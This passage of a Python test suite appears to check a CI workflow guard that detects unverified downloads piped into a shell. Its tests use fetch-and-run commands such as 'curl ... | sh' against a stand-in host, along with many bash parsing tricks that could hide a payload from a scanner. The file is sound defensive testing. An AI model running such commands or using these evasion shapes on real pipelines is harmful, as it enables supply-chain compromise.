    def test_a_hash_line_inside_a_multi_line_string_is_text(self):
        # V1 and V2; then V2 after a nested `"$(echo "it's")"`, whose
        # apostrophe is inside two strings, not the opening of a third.
        for opening in ('echo "multi\n# not a comment"',
                        "echo 'multi\n# not a comment'",
                        'echo "$(echo "it\'s")"\necho \'multi\n# not a comment\''):
            with self.subTest(opening=opening):
                self.flagged("%s ; %s\n" % (opening, self.PAYLOAD))

    def test_a_heredoc_operator_bash_does_not_read_swallows_nothing(self):
        # V3-V6: `<<WORD` inside "...", inside '...', inside a comment and as
        # the tail of a `<<<` here-string. Then inside backquotes, whose text
        # bash reads later as its own script, and as an arithmetic shift, in
        # `$((...))` and in the older `$[...]`.
        for opening, word in (('echo "<<true"', "true"),
                              ("echo '<<EOF'", "EOF"),
                              ("echo hi # see <<true", "true"),
                              ("cat <<<true", "true"),
                              ("echo `cat <<EOF`", "EOF"),
                              ("echo $((1<<X))", "X"),
                              ("echo $[1<<2]", "2]")):
            with self.subTest(opening=opening):
                self.flagged("%s\n%s\n%s\n" % (opening, self.PAYLOAD, word))

    def test_a_hash_that_does_not_start_a_word_is_text(self):
        # A `#` after a carriage return or a form feed -- word characters to
        # bash, whitespace to Python -- or inside `${...}` starts no comment;
        # a second comment rule in the statement splitter read all three as
        # one and hid the rest of the line.
        for opening in ("echo a\r# c", "echo a\x0c# c", "echo ${x:-a #b}"):
            with self.subTest(opening=opening):
                self.flagged("%s ; %s\n" % (opening, self.PAYLOAD))

    def test_a_backslash_ending_a_comment_or_a_quoted_body_continues_nothing(self):
        # V7: a comment ends at the newline, backslash or not. V8: a quoted
        # body is read verbatim, so its backslash cannot eat the terminator.
        self.flagged("echo hi # note \\\n%s\n" % self.PAYLOAD)
        self.flagged("cat <<'EOF'\ndata \\\nEOF\n%s\nEOF\n" % self.PAYLOAD)

    def test_a_body_ends_on_the_line_bash_ends_it_on(self):
        # The delimiter is the whole word, not its `EOF` prefix; `  EOF` is a
        # body line, not a terminator; an unquoted body is compared folded, so
        # `E\` + `OF` ends it; and the body starts after the newline that ends
        # the command, which a string running over two lines moves down. A
        # `\`-newline and a blank before the word are both gone to bash; read
        # as an empty word, they let the first empty line end the body -- here
        # the empty end after the script's last newline, past the payload.
        for script in ("cat <<EOF-X\nbody\nEOF-X\n%s\nEOF\n",
                       "cat <<EOF\n  EOF\nit's\nEOF\n%s\n",
                       "cat <<EOF\nE\\\nOF\n%s\nEOF\n",
                       'cat <<EOF; echo "multi\nline"\nbody\nEOF\n%s\n',
                       "cat << \\\n EOF\nit's\nEOF\n%s\n"):
            with self.subTest(script=script):
                self.flagged(script % self.PAYLOAD)

    def test_an_unterminated_quoted_body_is_refused_not_read_as_code(self):
        # #2692's differential row: Bash 3.2, Bash 5.2 and dash all treat the
        # `EOF; ...` line as body text, as they do `EOF ` with trailing space.
        # The guard must not manufacture a live pipeline out of either one.
        for tail in ("EOF; %s\n" % self.PAYLOAD,
                     "EOF \n%s\n" % self.PAYLOAD):
            with self.subTest(tail=tail):
                found = wg.job_defects([("step", "cat <<'EOF'\nx\n" + tail)])
                self.assertEqual(1, len(found), found)
                self.assertEqual("step", found[0][0])
                self.assertIn("quoted heredoc has no exact terminator", found[0][1])
                self.assertNotIn("straight to `sh`", found[0][1])

        # With the exact line present, the same pipeline really is code.
        self.flagged("cat <<'EOF'\nx\nEOF\n%s\n" % self.PAYLOAD)

    def test_a_continuation_inside_the_operator_is_gone(self):
        # #2291: to bash, `<\` + newline + `<EOF` is `<<EOF`, `<<\` + newline
        # + `-EOF` is `<<-EOF`, and `<\` + newline + `<< x` is `<<< x`; bash
        # 3.2 and 5.2 run the payload below each, which the guard read clean.
        # A joined word bash parses is refused by name, as it is unsplit;
        # `\` before a word and `<\` + newline + a file read as they did.
        for script in ("cat <\\\n<EOF\nit's\nEOF\n%s\n", "cat 3<\\\n<EOF\nit's\nEOF\n%s\n",
                       "cat <<\\\n-EOF\n\tit's\n\tEOF\n%s\n",
                       "cat <\\\n<\\\n-EOF\n\tit's\n\tEOF\n%s\n", "cat <\\\n<< x\n%s\nx\n",
                       "cat <<\\EOF\nit's $x\nEOF\n%s\n", "echo hi >f\ncat <\\\nf\n%s\n"):
            with self.subTest(script=script):
                self.flagged(script % self.PAYLOAD)
        self.refused("cat <\\\n<$(x)\nit's\n$(x)\n%s\n" % self.PAYLOAD, "`$(x)`")

    def test_an_array_subscript_is_arithmetic(self):
        # Where bash 5.2 reads an assignment -- at the head of a command, after
        # `x=1`, `then`, `time -p`, a pipe, `function f {` or a leading
        # redirection, and inside `name=(...)`, `declare`'s too -- it reads
        # `a[...]` as an arithmetic subscript, spaces, lines and all, so its
        # `<<` is a shift (3.2 rejects the two-line `a=(` and reads the
        # redirection line as a heredoc). The regex this replaced took
        # `a[i << X ]=y` for a heredoc and let the decoy line below end it;
        # the subscript rule before this one ended a subscript at its line
        # and opened none inside `(...)`, with the same result.
        for opening, word in (("a[1<<2]=x", "2]=x"), ("a[i << X ]=y", "X"),
                              ("x=1 a[1<<2]=y", "2]=y"),
                              ("if true; then a[1<<2]=y; fi", "2]=y"),
                              ("a[1\n<<X]=y", "X]=y"), ("a=([1<<X]=y)", "X]=y"),
                              ("declare a=([1<<X]=y)", "X]=y"),
                              ("a=(\n[1<<X]=y\n)", "X]=y"),
                              (">/dev/null a[1<<X]=y", "X]=y"),
                              ("time -p a[1<<X]=y", "X]=y"),
                              ("function f { a[1<<X]=y; }", "X]=y"),
                              ("x=$(echo) a[1<<X]=y", "X]=y"), ("true | a[1<<X]=y", "X]=y")):
            with self.subTest(opening=opening):
                self.flagged("%s\n%s\n%s\n" % (opening, self.PAYLOAD, word))

    def test_an_argument_is_no_subscript(self):
        # Among a command's arguments -- `echo`'s, `declare`'s, `printf`'s,
        # and a `time` after a pipe, an `if` after an assignment or a
        # redirection, which name programs there -- `<` ends the word and
        # `<<X]` is a heredoc, whose body holds the open quote. Read as a
        # subscript, the quote hid the payload bash runs after `X]`.
        for opening, word in (("echo a[1<<X]", "X]"), ("declare a[1<<X]=y", "X]=y"),
                              ("printf '%s' a[1<<X]", "X]"), ("true | time a[1<<X]", "X]"),
                              ("a=1 if a[1<<X]", "X]"), (">/dev/null if a[1<<X]", "X]"),
                              ("echo 2>&1 a[1<<X]", "X]"), ("echo &>/dev/null a[1<<X]", "X]"),
                              ("declare a=(x) b[1<<X]", "X]"), ("coproc c d a[1<<X]", "X]"),
                              ("\\a[1<<X]", "X]")):
            with self.subTest(opening=opening):
                self.flagged("%s\nit's\n%s\n%s\n" % (opening, word, self.PAYLOAD))
        # `a[1]x]=y` is no assignment, so it is the command: a pattern bash
        # globs, reported too (#2294), before the payload the heredoc hid.
        found = wg.job_defects([("step", "a[1]x]=y b[1<<X]\nit's\nX]\n%s\n" % self.PAYLOAD)])
        self.assertEqual(2, len(found), found)
        self.assertIn("`a[1]x]=y` is a pattern", found[0][1])
        self.assertIn("https://example.test/i.sh", found[1][1])

    def test_a_command_double_paren_is_read_as_bash_decides_it(self):
        # Bash matches a command's `((` to the close of its first group --
        # through quotes, escapes, backquotes and `$(...)`, not comments --
        # and reads one character more: `)` makes it arithmetic, anything
        # else two subshells, whose heredocs are real. Each opening below is
        # two subshells to bash 5.2, which reads the open quote as a body and
        # runs the payload (3.2 too, but for `function fn ((`, a syntax error
        # there); the reader took each for arithmetic, where `<<` is a shift,
        # and the quote hid the payload (M5).
        for opening in ("((cat <<EOF) )", "(((: <<EOF) ) )", "((: <<EOF '))' ) )",
                        '((: <<EOF "))" ) )', "((: <<EOF \\)) )",
                        "((: `echo )` <<EOF) )", "((: $'\\')' <<EOF) )",
                        "((: $[ ) ]<<EOF ) )", "((: $(echo ')') <<EOF) )",
                        "fn() ((cat <<EOF) )", "function fn ((cat <<EOF) )"):
            with self.subTest(opening=opening):
                self.flagged("%s\nit's\nEOF\n%s\n" % (opening, self.PAYLOAD))

    def test_arithmetic_ends_at_the_parenthesis_bash_ends_it_at(self):
        # `))` right after the first group -- past a `#`, a character to
        # arithmetic, and a quoted `(` -- is an arithmetic command: `<<` is a
        # shift, the lines below are code, and `y` ends no heredoc. And
        # arithmetic counts the parentheses in a `${...}` as its own, so a
        # `))` there ends `((...))` and `$((...))` alike and the heredoc after
        # it is real: the reader read on to a later `))`, and the body's open
        # quote hid the payload. Bash 5.2 runs each payload (3.2 refuses the
        # `{ ((x${y:-))}` line as a syntax error, and runs nothing).
        for script in ("((x=1<<y))\n%s\ny\n", "((i++ << y))\n%s\ny\n",
                       "(( x > 3 << y ))\n%s\ny\n",
                       "if (( a < b << y )); then :; fi\n%s\ny\n",
                       "((\n x<<y \n))\n%s\ny\n", "((: # <<y))\n%s\ny\n",
                       '((: $(echo "(") <<y))\n%s\ny\n',
                       "{ ((x${y:-))} <<EOF\nit's\nEOF\n%s\n",
                       "echo $((x${y:-))} <<EOF\nit's\nEOF\n%s\n"):
            with self.subTest(script=script):
                self.flagged(script % self.PAYLOAD)

    def test_nesting_too_deep_to_decide_fails_closed(self):
        # Each level of `((((` is read once more when bash's rule makes it a
        # subshell. Past eight times the script's length of that, the reader
        # raises instead of guessing, and the guard reports the step by name.
        script = "(" * 3000 + ": <<EOF" + ") " * 3000 + "\nit's\nEOF\n%s\n"
        self.refused(script % self.PAYLOAD, "`((`")

    def test_a_heredoc_its_substitution_closes_over_is_read_like_bash_52(self):
        # A `<<` in a `$(...)`, `<(...)` or `>(...)` that closes before the
        # newline its body would follow. Bash 3.2 reads the lines below as code;
        # 5.2 warns, files them as the body, and runs code after the terminator.
        # The reader follows 5.2's standing rule and reaches that payload.
        for opening in ('echo "$(cat <<EOF)"', "echo $(cat <<EOF)", "x=$(cat <<EOF)",
                        "cat <(cat <<EOF)", "echo >(cat <<EOF)", "echo ${x:-$(cat <<EOF)}",
                        "echo $[ $(cat <<EOF) ]", "(( $(cat <<EOF) ))", "a[$(cat <<EOF)]=1",
                        "echo $( (cat <<EOF) )", 'x=$(cat <<EOF; echo "a\nb")'):
            with self.subTest(opening=opening):
                self.flagged("%s\nit's\nEOF\n%s\n" % (opening, self.PAYLOAD))
        self.assertEqual([], wg.job_defects(
            [("step", 'echo "$(cat <<EOF)"\nit\'s\nEOF\n')]))
        # Backquotes are no such frame. Bash reads their text later, as a
        # script of its own in which the heredoc has no body, and 5.2 runs
        # nothing here: the open quote below is a syntax error. Read as before.
        self.assertEqual([], wg.job_defects(
            [("step", "echo `cat <<EOF`\nit's\nEOF\n%s\n" % self.PAYLOAD)]))

    def test_a_substitution_inside_arithmetic_is_code(self):
        # In `$((...))`, as in `((...))` and `$[...]`, bash reads a `$(...)`
        # as a command substitution: `#` starts a comment there, `<<` a
        # heredoc, whose body is read inside it or below an early close. The
        # reader read `$((...))` as one pair of parentheses, so a quote in
        # that comment, or in that body, hid a payload bash 5.2 runs (and
        # 3.2 runs the first).
        for script in ("echo $(( $(: # ) ) '\n) ))\n%s\n'\n",
                       "echo $(( $(cat <<EOF\nit's\nEOF\n) ))\n%s\n"):
            with self.subTest(script=script):
                self.flagged(script % self.PAYLOAD)
        # #2493's owner ruling supersedes the payload-specific result when
        # the substitution's heredoc body itself contains a `)`.
        ambiguous = "echo $(( $(: <<E\n)it's\nE\n) ))\n%s\n" % self.PAYLOAD
        self.refused(ambiguous, "a `)` in a substitution heredoc body")
        for opening in ("echo $(( $(cat <<EOF) ))", "echo $(( $(( $(cat <<EOF) )) ))"):
            with self.subTest(opening=opening):
                self.flagged("%s\nit's\nEOF\n%s\n" % (opening, self.PAYLOAD))
        # Outside such a substitution `<<` is still a shift, and the line
        # below that spells its right side ends nothing.
        for opening, word in (("echo $(( 1<<2 ))", "2"), ("echo $(( a << b ))", "b"),
                              ("echo $(( $(nproc) * 2 ))", "2"), ("echo $[1<<2]", "2]")):
            with self.subTest(opening=opening):
                self.flagged("%s\n%s\n%s\n" % (opening, self.PAYLOAD, word))
        # Backquotes in arithmetic are text until bash runs them, as a
        # script of its own in which the heredoc has no body: 5.2 runs
        # nothing here, the open quote below being a syntax error.
        self.assertEqual([], wg.job_defects(
            [("step", "echo $(( `cat <<EOF` ))\nit's\nEOF\n%s\n" % self.PAYLOAD)]))

    def test_a_body_inside_its_open_substitution_is_read_there(self):
        # The fleet's form, where the body lines sit inside a `$(...)` still
        # open, reads as it did: a body with an open quote is read as a body,
        # and hides nothing that follows the substitution.
        for opening in ("X=\"$(cat <<'EOF'\nit's\nEOF\n)\"",
                        "echo ${x:-$(cat <<EOF\nit's\nEOF\n)}", "cat <(cat <<EOF\nit's\nEOF\n)"):
            with self.subTest(opening=opening):
                self.flagged("%s\n%s\n" % (opening, self.PAYLOAD))

    def test_a_delimiter_bash_parses_to_spell_is_refused(self):
        # Bash spells these delimiters by PARSING the word -- a substitution
        # or an extglob pattern -- and ends the body only at a line spelled
        # the same. The reader decodes Bash's ASCII ANSI-C table, but parses
        # no expansions. Neither reading short of those is safe: the regex
        # this replaced guessed that `<<EOF$(x)` was `<<EOF`, so the decoy
        # line below the payload ended the body. Reading the body as code let
        # the quote in `it's` hide the payload below the terminator, which bash 3.2 and
        # 5.2 both run (#2224). So the step is refused, and the reason names
        # the word. The same shape spelled with no parse -- quoted, or a
        # literal ANSI-C word decoded exactly -- remains readable.
        for word, terminator, decoy, spelled in (
                ("$(a b)", "$(a b)", "$", "'$(a b)'"),
                ("${x y}", "${x y}", "${x", "'${x y}'"),
                ("@(a b)", "@(a b)", "@", "'@(a b)'"),
                ('"$(echo ")")"', "$(echo ))", "$(echo ", "'$(echo ))'"),
                ("EOF$(x)", "EOF$(x)", "EOF", "EOF'$(x)'")):
            opening = "shopt -s extglob\ncat <<" if word[0] == "@" else "cat <<"
            with self.subTest(word=word):
                self.refused(opening + "%s\nit's\n%s\n%s\n" % (word, terminator, self.PAYLOAD),
                             "`%s`" % word)
                self.refused(opening + "%s\n%s\n%s\n%s\n" % (word, terminator, self.PAYLOAD,
                                                             decoy), "`%s`" % word)
                self.flagged(opening + "%s\nit's\n%s\n%s\n" % (spelled, terminator,
                                                               self.PAYLOAD))
        self.flagged("cat <<$'\\x41'\nit's\nA\n%s\n" % self.PAYLOAD)
        self.flagged("cat <<EOF\nit's\nEOF\n%s\n" % self.PAYLOAD)

    def test_a_text_the_guard_reads_again_is_refused_by_its_step(self):
        # The guard reads the text of each substitution as a script of its
        # own: a backquote's text, a `$(...)` in an expanding heredoc body,
        # and a `$( ...)` holding a `((` nest that the whole step is long
        # enough to read under the cap and the substitution alone is not.
        # Each raised when `_defects` read it again, past the step's own
        # read, as a traceback naming no step.
        for script, cause in (("echo `echo $(cat <<EOF)`\n", "closes before"),
                              ('cat <<EOF\n$(echo "$(cat <<X)"\n)\nEOF\n', "closes before"),
                              ("echo $( %s: <<EOF%s\nit's\nEOF\n)\n# %s\n"
                               % ("(" * 50, ") " * 50, "x" * 4000), "`((`")):
            with self.subTest(script=script[:30]):
                self.refused(script, cause)

    def test_the_job_reads_again_only_what_its_steps_read(self):
        # `job_defects` catches those per step because each step's walk --
        # `read`, then `_walk` -- is the one read of every text, substitutions
        # included, and `_defects` is handed that walk's records instead of
        # reading them again (#2287): a text only `_defects` parsed would
        # raise past the catch. So the job reads nothing again, and each text
        # once in each of its passes -- `main`'s and the second walk's (#2858
        # round 11: `job_defects` unions their findings, so it reads a job
        # twice). A marker's prefix is minted per parse, so texts are compared
        # without it.
        parsed = []
        job = [False]
        statements, defects = wg.statements, wg._defects

        def recorded(text):
            parsed.append((job[0], workflow_options._MAINS.get(), re.sub(r"@@shell-[0-9a-f]+-", "@@", text)))
            return statements(text)

        def marked(*args):
            job[0] = True
            try:
                return defects(*args)
            finally:
                job[0] = False

        # Each text is written once, in one step only: no other step's walk
        # can parse it in that step's place.
        steps =[("nested", "echo $(echo $(echo `echo $(true)`))\n"),
                 ("body", 'cat <<EOF\n$(printf "$(id)" `pwd`)\nEOF\n'),
                 ("strings", "eval \"$(echo $(date))\"\nx=$(sh -c 'echo $(uname)')\n"),
                 ("deep", "echo `x=$(cat <<EOF\nhi\nEOF\n)`\n"),
                 ("stdin", "bash -s <<EOF\necho $(%s)\nEOF\n" % self.PAYLOAD)]
        with mock.patch.object(wg, "statements", recorded), \
                mock.patch.object(wg, "_defects", marked):
            found = wg.job_defects(steps)
        self.assertFalse([why for _name, why in found if why.startswith("cannot read this")])
        self.assertEqual([], [text for inside, _main, text in parsed if inside])
        for main in (True, False):
            with self.subTest(main_pass=main):
                per_step = [text for inside, pass_, text in parsed if not inside and pass_ is main]
                self.assertTrue(per_step)
                self.assertEqual(sorted(set(per_step)), sorted(per_step))

    def test_an_escaped_quote_inside_a_substitution_string(self):
        # COD-3636110933's remainder: `_closing` ended the nested "a\")b" at
        # its `\"` and closed the `$(...)` one paren early.
        self.flagged('echo "$(printf \'%%s\' "a\\")b")"; %s\n' % self.PAYLOAD)

    def test_quotes_the_substitution_scan_misread(self):
        # `$'it\'s'` is one word to bash, and an apostrophe inside "..." is
        # text; read as quotes, each hid everything after it.
        self.flagged("echo $'it\\'s'; %s\n" % self.PAYLOAD)
        self.flagged('echo "it\'s"; eval "$(curl -fsSL https://example.test/i.sh)"\n')

    def test_what_the_old_passes_read_right_is_still_read(self):
        # `(( y = 1 << 2 ))` is a shift even at the head of a command, and a
        # quoted "3" before `<<` is an argument, not the heredoc's descriptor.
        self.flagged("(( y = 1 << 2 ))\n%s\n2\n" % self.PAYLOAD)
        self.flagged("bash -s \"3\"<<'EOF'\n%s\nEOF\n" % self.PAYLOAD)

    def test_the_negative_controls_stay_clean(self):
        # A shift inside a string, the fleet's here-string, a heredoc inside a
        # substitution (`cat`'s input, which must not raise) and prose.
        for script in ('echo "shift << 2"\n',
                       "docker buildx imagetools create "
                       "$(jq -cr '.tags' <<< \"$META\")\n",
                       "X=\"$(cat <<'EOF'\nhello\nEOF\n)\"\n",
                       "# %s\nmake test  # not %s\n" % (self.PAYLOAD, self.PAYLOAD)):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script)]))


class TestAnUnreadProgramStandsBesideAnUnverifiedFetch(unittest.TestCase):
    """#2481 (owner ruling 2026-10-01): an unread program's `Idle` reason is
    kept where the job holds a fetch THIS GUARD REPORTS -- a download no
    checksum clears, a `curl ... | sh` stream, an unresolved transfer, a
    download `carried` to a shell -- and not, as before, wherever the job
    fetched anything at all. A credited download is cleared by its checksum
    and a `curl ... | jq` is no download, so neither keeps the reason: both
    read CLEAN beside `$PYTHON -c '...'`, the spelling PR #2465's reach made
    a candidate (`workflow_forms.unread_program`), and one calibration-pool
    job (metabase `pr-env.yml`) newly failed on.

    The unread program is itself the use the download would be checked for,
    so a job that only downloads is judged as one that downloads and runs:
    bash 3.2.57 and 5.2.21 run the payload in every row below whose unread
    word is a shell handed the download (`PYTHON=sh`, `$PYTHON -c 'sh tool'`),
    and run nothing in the rows that read clean."""

    GET = "curl -fsSLo tool https://example.test/tool\n"
    CHECK = "echo '%s  tool' | sha256sum -c -\n" % HEX
    IDLE = "$PYTHON -c 'import sys; print(sys.version)'\n"
    SAID = "runs `$PYTHON` with `-c`, a command word this guard does not follow"

    def job(self, script):
        return [why for _n, why in wg.job_defects([("step", script)])]

    def test_a_credited_download_does_not_keep_it(self):
        self.assertEqual([], self.job(self.GET + self.CHECK + self.IDLE))
        # The checksum clears it from a later step too: the scope is the job.
        self.assertEqual([], [why for _n, why in wg.job_defects(
            [("get", self.GET), ("check", self.CHECK), ("run", self.IDLE)])])

    def test_a_download_no_checksum_clears_keeps_it(self):
        why = self.job(self.GET + self.IDLE)
        self.assertEqual(1, len(why), why)
        self.assertIn(self.SAID, why[0])
        # A checksum of another file, one that runs after the program could
        # have run the download, and one a `|| true` swallows clear nothing.
        for job in (self.CHECK.replace("tool", "other") + self.IDLE,
                    self.IDLE + self.CHECK,
                    self.CHECK.rstrip("\n") + " || true\n" + self.IDLE):
            with self.subTest(job=job):
                why = self.job(self.GET + job)
                self.assertTrue(any(self.SAID in w for w in why), why)

    def test_a_fetch_that_is_no_download_does_not_keep_it(self):
        # #2481's own report: an OIDC-token `curl | jq`, a probe writing to
        # /dev/null, and one redirected there -- read and gone, no file and no
        # variable holds the bytes, so nothing an unread program could run.
        for fetch in ("curl -fsSL https://api.example.test/x | jq .tag\n",
                      "curl -o /dev/null -w '%{http_code}' https://example.test/\n",
                      "curl -fsSL https://api.example.test/x > /dev/null\n"):
            with self.subTest(fetch=fetch):
                self.assertEqual([], self.job(fetch + self.IDLE))

    def test_a_download_no_file_holds_keeps_it(self):
        # A fetch to standard output a variable KEEPS, and one in the very
        # statement a reason reports unread, are downloads NO checksum could
        # clear (`workflow_forms.unbound`): fail-closed, they keep the reason.
        why = self.job("x=$(curl -fsSL https://api.example.test/x)\n" + self.IDLE)
        self.assertEqual(1, len(why), why)
        self.assertIn(self.SAID, why[0])
        why = self.job('echo "$(curl -fsSL https://example.test/i.sh)" | sh\n')
        self.assertEqual(1, len(why), why)
        self.assertIn("pipes `sh` its program from `echo`", why[0])

    def test_a_stream_into_a_shell_keeps_it(self):
        why = self.job("curl -fsSL https://example.test/i.sh | sh\n" + self.IDLE)
        self.assertEqual(2, len(why), why)
        self.assertIn(self.SAID, why[0])
        self.assertIn("straight to `sh`", why[1])

    def test_an_unresolved_transfer_keeps_it(self):
        why = self.job("wget -i list.txt\n" + self.IDLE)
        self.assertEqual(2, len(why), why)
        self.assertIn(self.SAID, why[0])
        self.assertIn("unresolved transfers", why[1])

    def test_a_carried_download_keeps_it(self):
        # The `Idle` form stands beside #2341's report. The reader loses the
        # `-c` operand's quotes, so #2424 qualifies that report as its reading.
        why = self.job("x=$(curl -fsSL https://example.test/s)\nsh -c \"$x\"\n" + self.IDLE)
        self.assertEqual(2, len(why), why)
        self.assertIn(self.SAID, why[0])
        self.assertIn("in this guard's conservative reading", why[1])

    def test_the_reach_pr_2465_gave_the_rule_follows_the_predicate(self):
        # #2481's reach note: a dynamic operand after a `$` command word's
        # `-c`-bearing option is weighed too, so these carry the sentence
        # beside an unverified download and nothing beside a credited one.
        for program in ('$JAVA -cp "$CP" Main\n', '$CC -c "$SRC"\n'):
            with self.subTest(program=program):
                self.assertTrue(self.job(self.GET + program))
                self.assertEqual([], self.job(self.GET + self.CHECK + program))

    def test_a_checksum_after_the_unread_program_clears_nothing(self):
        # Review r0 finding 1 (BLOCKER): the unread form's synthetic use is
        # ADDED to the readable uses, never a fallback for them. Give the
        # download one readable use a checksum clears and the program standing
        # BETWEEN the download and that checksum went unweighed -- the one
        # moment the bytes are on disk and nothing has verified them. Bash
        # 3.2.57 and 5.2.21 both run the payload here (`PYTHON=sh`, the
        # program `sh tool`) with the checksum still refusing afterwards.
        use = "chmod +x tool\n./tool\n"
        why = self.job(self.GET + self.IDLE + self.CHECK + use)
        self.assertEqual(1, len(why), why)
        self.assertIn(self.SAID, why[0])
        # Split across steps, with the readable use being an unpack, a copy
        # onto PATH or a container run, and with the unread form inside a
        # branch or a substitution: the same answer every time.
        self.assertTrue([w for _n, w in wg.job_defects(
            [("get", self.GET), ("run", self.IDLE), ("check", self.CHECK), ("use", use)])])
        for form, readable in ((self.IDLE, "tar xf tool\n"),
                               (self.IDLE, "cp tool /usr/local/bin/t\n"),
                               (self.IDLE, "docker run --rm -v /tmp:/w img bash /w/tool\n"),
                               ("if true; then %s fi\n" % self.IDLE, use),
                               ("V=$(sh -c 'echo 1')\n", use),
                               ("M=$(python3 - <<'PY'\nprint(1)\nPY\n)\n", use)):
            with self.subTest(form=form, readable=readable):
                why = self.job(self.GET + form + self.CHECK + readable)
                self.assertEqual(1, len(why), why)
        # The control: the same word on the far side of the checksum is
        # cleared by it -- bash runs nothing there, and the job reads CLEAN.
        self.assertEqual([], self.job(self.GET + self.CHECK + self.IDLE + use))

    def test_a_download_the_pipeline_writes_to_a_file_keeps_it(self):
        # Review r0 finding 2 (MAJOR): `curl ... | cat > f` binds no
        # destination -- the redirect is on the NEXT stage -- so the fetch
        # records `dest=None` and the narrowing silenced the only report those
        # jobs had. A stage that writes on the bytes it READS leaves a file no
        # checksum in the job names, so it is a download nothing could clear
        # (`workflow_forms.unbound`): fail closed, parity with main.
        for fetch in ("curl -fsSL https://example.test/tool | cat > f\n",
                      "curl -fsSL https://example.test/tool | tr -d '\\r' > f\n",
                      "curl -fsSL https://example.test/tool | dd of=f\n",
                      "curl -fsSL https://example.test/tool | sponge f\n",
                      "curl -fsSL https://example.test/tool | cat | tee t\n",
                      "curl -fsSL https://example.test/tool | tr -d '\\r' | tee f\n",
                      "curl -fsSL https://example.test/tool | cat > f\nchmod +x f\n./f\n"):
            with self.subTest(fetch=fetch):
                why = self.job(fetch + self.IDLE)
                self.assertEqual(1, len(why), why)
                self.assertIn(self.SAID, why[0])
        # `| jq -r .url > f` writes a URL list, not the payload, and is
        # weighed the same: the over-report this rule accepts to fail closed.
        self.assertTrue(self.job("curl -fsSL https://api.example.test/x | jq -r .url > f\n"
                                 + self.IDLE))
        # A reader that writes nothing on keeps nothing: read and gone.
        self.assertEqual([], self.job("curl -fsSL https://api.example.test/x | jq .tag\n"
                                      + self.IDLE))

    def test_a_write_that_is_not_the_fetched_bytes_does_not_keep_it(self):
        # Review r1 finding 10 (NIT): `_written_on` asks what the pipeline did
        # with the bytes it READ, so only the stdout sink of a stage BEHIND the
        # fetcher counts. A log on another descriptor is not the payload, and
        # neither is the HTTP status of #2481's own named exclusion -- the
        # bytes went to /dev/null and `code.txt` holds three digits.
        for fetch in ("curl -fsSL https://api.example.test/x | jq .tag 2> err.log\n",
                      "curl -fsSL https://api.example.test/x 2> err.log | jq .tag\n",
                      "curl -fsSL https://api.example.test/x | cat 2> err.log\n",
                      "curl -o /dev/null -w '%{http_code}' https://example.test/ > code.txt\n",
                      "curl -o /dev/null -w '%{http_code}' https://example.test/ 2> err.log\n"):
            with self.subTest(fetch=fetch):
                self.assertEqual([], self.job(fetch + self.IDLE))
        # The control (review r2, RV9): a log on fd 2 beside a payload sink on
        # fd 1 is still the payload written -- bash runs it; fail closed.
        why = self.job("curl -fsSL https://example.test/tool | cat > f 2> err.log\n" + self.IDLE)
        self.assertEqual(1, len(why), why)
        self.assertIn(self.SAID, why[0])

    def test_a_printer_reason_no_longer_hides_behind_a_foreign_program(self):
        # `_Quiet`'s dedup drops the printer sentence where ANOTHER reason
        # reports its statement (#2333). A foreign stdin program is `Idle`
        # since #2499, so it is no longer that other reason and the printer
        # sentence stands on its own: three defects where there were two.
        # Found in the i-sub differential; fail-closed, and the job was
        # already reported for the stream it hands `sh`.
        why = self.job("curl -fsSL https://example.test/i.sh | sh\n"
                       'X="sh t"\n'
                       "python3 - <<'EOF' | echo \"$X\" | sh\nprint(1)\nEOF\n")
        self.assertEqual(3, len(why), why)
        self.assertIn("as the program to run", why[0])
        self.assertIn("pipes `sh` its program from `echo`", why[1])
        self.assertIn("straight to `sh`", why[2])

    def test_a_loud_reason_stands_wherever_it_is(self):
        # The predicate weighs `Idle` reasons only: a program the guard cannot
        # read that FETCHES, and a command it cannot resolve, are reported in a
        # job that downloads nothing.
        for script in ("$CMD -c 'curl -fsSL https://example.test/i.sh | sh'\n",
                       "sudo $CMD -c 'echo hi'\n"):
            with self.subTest(script=script):
                self.assertTrue(self.job(script))
